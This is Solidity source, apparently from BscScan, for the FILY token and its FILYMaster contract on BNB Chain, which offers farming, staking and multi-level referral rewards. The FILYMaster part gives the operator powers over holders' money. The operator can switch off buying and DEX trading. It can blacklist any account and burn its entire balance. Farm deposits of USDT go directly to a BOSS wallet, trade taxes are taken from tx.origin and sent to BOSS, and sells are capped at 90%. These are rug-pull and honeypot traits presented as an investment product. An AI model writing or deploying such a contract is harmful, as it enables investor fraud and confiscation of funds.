/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor() {
        _name = "FILY";
        _symbol = "FILY";
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;            
            _totalSupply -= amount;
        }
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IPancakeSwapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IPancakeSwapV2Router01 {
    function factory() external pure returns (address);
}

contract FILYMaster is ERC20 {
    address public USDT;
    address public Operator;
    address public BOSS; 
    address public Admin;
    uint256 public LastPrice; 
    uint256 public EnableBuyTime; 
    uint256 public BuyCD; 

    mapping(address => bool) public Manager; 
    mapping(address => bool) public BlackList; 
    uint256 public ManagerAmount; 

    bool public FarmEnabled; 
    bool public TaxEnabled; 
    bool public BuyFreeze;
    bool public StopDex; 
    bool public StopBuy; 
    uint256 public PriceUpLimit; 

    IERC20 public LPInstance;
    address public uniswapV2Pair;
    IPancakeSwapV2Router01 public uniswapV2Router;

    mapping(address => uint256) public UserStakeAmount; 
    mapping(address => uint256) public TEAMStakeAmount; 
    mapping(address => bool) public UserHasTEAM; 
    mapping(address => uint256) public SonsAmount; 

    mapping(address => uint256) public UserLastStakeWithDrawTimestamp; 
    mapping(address => uint256) public UserLastTEAMWithDrawTimestamp; 
    mapping(address => uint256) public UserTEAMRewardNoPaid; 

    mapping(address => address) public Upper; 
    mapping(address => address[]) public Son; 
    mapping(address => uint256) private UserTopLPAmount; 
    uint256 public totalFarmAmount; 
    uint256 public totalStakeAmount; 
    uint256 public AccFarmReward; 
    mapping(address => uint256) public ManagerFarmRewardPaid; 

    uint256 public FarmAmountLimit; 
    uint256 public totalStakeReward; 
    uint256 public StakeRewardSpeed; 
    uint256 public TopPrice24H; 

    struct TEAMLimit {
        uint256 StakeAmount;
        uint256 TEAMStakeAmount;
        uint256 SonAmount;
    }

    TEAMLimit[] public TEAMLimitList;
    modifier EOA() {
        require(tx.origin == msg.sender, "EOA Only");
        address account = msg.sender;
        require(account.code.length == 0, "msg.sender.code.length == 0");
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        require(size == 0, "extcodesize == 0");
        _;
    }

    modifier OnlyOperator() {
        require(msg.sender == Operator, "FILY : Only Operator");
        _;
    }
    
    constructor() {
        TopPrice24H = 1e18; 
        LastPrice = 1e18; 
        BOSS = address(0xb59839711A3925eaC4f2CbeC7E32cF0326f50F4A); 
        Admin = address(0xb59839711A3925eaC4f2CbeC7E32cF0326f50F4A);
        Operator = msg.sender;
        BuyCD = 86400;
        BuyFreeze = true;
        StopBuy = true;
        PriceUpLimit = 130;
        FarmAmountLimit = 4800 * 1e4 * 1e18; 
        EnableBuyTime = block.timestamp;
        USDT = address(0x55d398326f99059fF775485246999027B3197955);
        uniswapV2Router = IPancakeSwapV2Router01(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapV2Pair = IPancakeSwapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), USDT);
        LPInstance = IERC20(uniswapV2Pair);
        _approve(BOSS, address(uniswapV2Router), type(uint256).max);
        _mint(address(BOSS), 60 * 1e4 * 1e18);
        TEAMLimitList.push(
            TEAMLimit({
                StakeAmount: 1200 * 1e18,
                TEAMStakeAmount: 500000 * 1e18,
                SonAmount: 20 
            })
        );
        TEAMLimitList.push(
            TEAMLimit({
                StakeAmount: 800 * 1e18,
                TEAMStakeAmount: 300000 * 1e18,
                SonAmount: 16
            })
        );
        TEAMLimitList.push(
            TEAMLimit({
                StakeAmount: 400 * 1e18,
                TEAMStakeAmount: 200000 * 1e18,
                SonAmount: 12
            })
        );
        TEAMLimitList.push(
            TEAMLimit({
                StakeAmount: 200 * 1e18,
                TEAMStakeAmount: 50000 * 1e18,
                SonAmount: 8
            })
        );
        TEAMLimitList.push(
            TEAMLimit({
                StakeAmount: 10 * 1e18,
                TEAMStakeAmount: 10000 * 1e18,
                SonAmount: 4
            })
        );
    }

    function setTax() external OnlyOperator {
        TaxEnabled = !TaxEnabled;
    }

    function setDex() external OnlyOperator {
        StopDex = !StopDex;
    }

    function setFarmEnable() external OnlyOperator {
        FarmEnabled = !FarmEnabled;
    }

    function setBuyEnable() external OnlyOperator {
        StopBuy = !StopBuy;
    }

    function getPrice() public view returns (uint256) {
        if (
            IERC20(address(this)).balanceOf(address(uniswapV2Pair)) > 0 &&
            IERC20(USDT).balanceOf(address(uniswapV2Pair)) > 0
        ) {
            return
                (IERC20(USDT).balanceOf(address(uniswapV2Pair)) * 1e18) /
                IERC20(address(this)).balanceOf(address(uniswapV2Pair));
        } else {
            return 0;
        }
    }

    function priceLimit() internal {
        uint256 nowPrice = getPrice();
        if (nowPrice > TopPrice24H) {
            TopPrice24H = nowPrice;
        }

        if (nowPrice > (LastPrice * PriceUpLimit) / 100 && !BuyFreeze) {
            EnableBuyTime = block.timestamp + BuyCD; 
            BuyFreeze = true;
        }

        if (block.timestamp >= EnableBuyTime && BuyFreeze) {
            LastPrice = nowPrice;
            BuyFreeze = false;
        }
    }

    function priceRate() external view returns (uint256) {
        return (getPrice() * 1e18) / LastPrice;
    }
    
    function checkLP(address account) internal {
        require(!BlackList[account], "checkLP : You are blacklisted");
        if (
            account == Admin ||
            account == Operator ||
            account == BOSS ||
            account == address(uniswapV2Router) ||
            account == address(uniswapV2Pair) ||
            !Manager[account] 
        ) {
            return;
        }

        if (LPInstance.balanceOf(account) > UserTopLPAmount[account]) {
            UserTopLPAmount[account] = LPInstance.balanceOf(account);
        }

        if (
            LPInstance.balanceOf(account) < UserTopLPAmount[account] &&
            !BlackList[account]
        ) {
            ClearReward_AddBlackList(account);
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        checkLP(from);
        checkLP(to);
        
        if (from == address(uniswapV2Pair)) {
            require(!StopBuy, "Stop PancakeSwap Buy");
            require(block.timestamp >= EnableBuyTime, "Stop Buy");
        }

        if (
            from == Admin &&
            to != address(uniswapV2Pair) &&
            amount == 200 * 1e18
        ) {
            super._transfer(from, to, amount);
            if (!Manager[to]) {
                ManagerAmount += 1;
                Manager[to] = true; 
            }
            return;
        }

        if (from == address(this) || to == address(this) || !TaxEnabled) {
            super._transfer(from, to, amount);
            return;
        }
        
        if (from != address(uniswapV2Pair) && to != address(uniswapV2Pair)) {
            super._transfer(from, to, amount);
            return;
        }
        
        if (from == address(uniswapV2Pair) && TaxEnabled) {
            require(!StopDex, "Stop Pancakeswap!"); 
            if (totalSupply() > 60 * 1e4 * 1e18) {
                _burn(tx.origin, amount / 100);
            }
            super._transfer(tx.origin, BOSS, amount / 20); 
            super._transfer(from, to, (amount * 19) / 20); 
            priceLimit(); 
            return;
        }
        
        if (to == address(uniswapV2Pair) && TaxEnabled) {
            require(amount <= (balanceOf(from) * 9) / 10, "Only sell 90%");
            uint256 _burnAmount;
            if (totalSupply() > 60 * 1e4 * 1e18) {
                _burnAmount = amount / 50;
                _burn(tx.origin, _burnAmount);
            }
            super._transfer(tx.origin, BOSS, (amount * 8) / 100); 
            super._transfer(from, to, (amount * 92) / 100 - _burnAmount); 
            priceLimit();
            return;
        }

        require(false, "what this?");
    }

    function ClearReward_AddBlackList(address account) private {
        BlackList[account] = true; 
        Manager[account] = false; 
        ManagerAmount -= 1; 
        UserStakeAmount[account] = 0;
        super._burn(account, super.balanceOf(account));
    }

    function Admin_ClearReward_AddBlackList(address account)
        external
        OnlyOperator
    {
        ClearReward_AddBlackList(account);
    }

    function getTEAMLevel(address account) public view returns (uint256) {
        if (BlackList[account]) return 0;
        for (uint256 i = 0; i < TEAMLimitList.length; i++) {
            if (
                UserStakeAmount[account] >= TEAMLimitList[i].StakeAmount &&
                SonsAmount[account] >= TEAMLimitList[i].SonAmount &&
                TEAMStakeAmount[account] >= TEAMLimitList[i].TEAMStakeAmount
            ) {
                return TEAMLimitList.length - i;
            }
        }
        return 0;
    }

    function farm(uint256 USDTAmount) external EOA {
        require(
            USDTAmount % (100 * 1e18) == 0 && FarmEnabled,
            "USDT must be >= 100 and Farm Enabled"
        );
        require(
            totalFarmAmount <= FarmAmountLimit,
            "totalFarmAmount <= FarmAmountLimit"
        );
        
        IERC20(USDT).transferFrom(msg.sender, BOSS, USDTAmount);
        uint256 FILYAmount = (USDTAmount * 1e18) / getPrice();
        _mint(msg.sender, FILYAmount); 
        _mint(address(this), (FILYAmount * 13) / 100); 
        
        totalFarmAmount += FILYAmount; 
        AccFarmReward += (FILYAmount * 13) / 100 / ManagerAmount; 
    }
    
    function getFarmReward(address account) public view EOA returns (uint256) {
        if (BlackList[account] || !Manager[account]) return 0;
        return AccFarmReward - ManagerFarmRewardPaid[account];
    }

    function WithdrawFarmReward() external EOA {
        require(
            Manager[msg.sender] && !BlackList[msg.sender],
            "You are not a manager or in BlackList"
        );
        uint256 _reward = getFarmReward(msg.sender); 
        if (_reward != 0) {
            ManagerFarmRewardPaid[msg.sender] += AccFarmReward; 
            super._transfer(address(this), msg.sender, _reward); 
        }
    }
    
    function updateTEAMAndReward(
        address account,
        uint256 stakeAmount,
        bool UpDown
    ) internal {
        address _upper = Upper[account]; 
        address _account = account;
        uint256 LevelGap;
        for (uint256 i = 0; i < 5; i++) {
            if (getTEAMLevel(_upper) > getTEAMLevel(_account)) {
                LevelGap = getTEAMLevel(_upper) - getTEAMLevel(_account);
            } else {
                LevelGap = 0;
            }
            if (_upper != address(0) && !BlackList[_upper] ) {
                UserTEAMRewardNoPaid[_upper] +=
                (block.timestamp - UserLastTEAMWithDrawTimestamp[_account]) 
                * (TEAMStakeAmount[_account] + UserStakeAmount[_account])
                * LevelGap  
                * 11574074074074
                / 1000
                / 1e18;
                if (UpDown) {
                    TEAMStakeAmount[_upper] += stakeAmount;
                } else {
                    TEAMStakeAmount[_upper] -= stakeAmount;
                }
                UserLastTEAMWithDrawTimestamp[_account] = block.timestamp; 
                _account = _upper;
                _upper = Upper[_upper];
            } else {
                break;
            }
        }
    }

    
    function updateStakeReward(address account) internal {
        UserTEAMRewardNoPaid[account] +=
            ((block.timestamp - UserLastStakeWithDrawTimestamp[account]) *
                UserStakeAmount[account] *
                getTEAMLevel(account) *
                11574074074074) /
            1e18;
        UserLastStakeWithDrawTimestamp[account] = block.timestamp; 
    }
    
    function getTEAMStakeReward(address account) public view returns (uint256) {
        return UserTEAMRewardNoPaid[account]; 
    }

    function getUserStakeReward(address account) public view returns (uint256) {
        uint level;
        for (uint256 i = 0; i < TEAMLimitList.length; i++) {
            if (
                UserStakeAmount[account] >= TEAMLimitList[i].StakeAmount
            ) {
                level = TEAMLimitList.length - i;
                break;
            }
        }
        uint256 _stakeReward = UserStakeAmount[account] *
            (block.timestamp - UserLastStakeWithDrawTimestamp[account])
            *level 
            *11574074074074
            /1000
            /1e18; 
        return _stakeReward;
    }

    function getSonStakeAmount(address account) public view returns (uint256) {
        uint256 _amount;
        for (uint256 i = 0; i < Son[account].length; i++) {
            _amount += TEAMStakeAmount[Son[account][i]]; 
        }
        return _amount;
    }

    function stake(address _upper, uint256 amount) external EOA {
        require(
            !BlackList[msg.sender] &&
                _upper != address(0) &&
                _upper != msg.sender,
            "amount must be > 0, upper != yourself != blackhole"
        );
        if (UserLastStakeWithDrawTimestamp[msg.sender] == 0) {
            UserLastStakeWithDrawTimestamp[msg.sender] = block.timestamp;
        }
        if (UserLastTEAMWithDrawTimestamp[msg.sender] == 0) {
            UserLastTEAMWithDrawTimestamp[msg.sender] = block.timestamp;
        }
        if (Upper[msg.sender] == address(0)) {
            Upper[msg.sender] = _upper;
            Son[_upper].push(msg.sender);
        }
        totalStakeAmount += amount;
        updateStakeReward(msg.sender); 
        super._transfer(msg.sender, address(this), amount);
        UserStakeAmount[msg.sender] += amount;
        if (
            UserStakeAmount[msg.sender] >= 50 * 1e18 &&
            Upper[msg.sender] != address(0) &&
            !UserHasTEAM[msg.sender]
        ) {
            SonsAmount[Upper[msg.sender]] += 1; 
            UserHasTEAM[msg.sender] = true; 
        }
        updateTEAMAndReward(msg.sender, amount, true); 
    }

    function unStake(uint256 amount) external EOA {
        require(
            amount > 0 &&
                !BlackList[msg.sender] &&
                UserStakeAmount[msg.sender] >= amount,
            "amount must be > 0"
        );
        updateStakeReward(msg.sender); 
        UserStakeAmount[msg.sender] -= amount;
        super._transfer(address(this), msg.sender, amount);
        if (
            UserStakeAmount[msg.sender] < 50 * 1e18 &&
            Upper[msg.sender] != address(0) &&
            UserHasTEAM[msg.sender]
        ) {
            SonsAmount[Upper[msg.sender]] -= 1;
            UserHasTEAM[msg.sender] = false;
        }
        updateTEAMAndReward(msg.sender, amount, false); 
        totalStakeAmount -= amount; 
    }

    function WithdrawStakeReward() external EOA {
        updateTEAMAndReward(msg.sender, 0, true); 
        uint256 reward = getUserStakeReward(msg.sender);
        uint256 _teamReward = UserTEAMRewardNoPaid[msg.sender];
        UserTEAMRewardNoPaid[msg.sender] = 0; 
        UserLastStakeWithDrawTimestamp[msg.sender] = block.timestamp; 
        
        require(
            totalStakeReward <= 6000 * 1e4 * 1e18 - FarmAmountLimit,
            "totalSupply < 1200w"
        ); 
        super._mint(msg.sender, reward + _teamReward);
        totalStakeReward += reward + _teamReward;
    }

    function WithdrawBOSS(address token) external {
        IERC20(token).transfer(BOSS, IERC20(token).balanceOf(address(this)));
        payable(BOSS).transfer(address(this).balance);
    }

    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }
    
    function getSonAmount(address account) public view returns (uint256) {
        return Son[account].length;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function getSon(address account) public view returns (address[] memory) {
        address[] memory _address = new address[](Son[account].length);
        for (uint256 i = 0; i < Son[account].length; i++) {
            _address[i] = Son[account][i];
        }
        return _address;
    }
}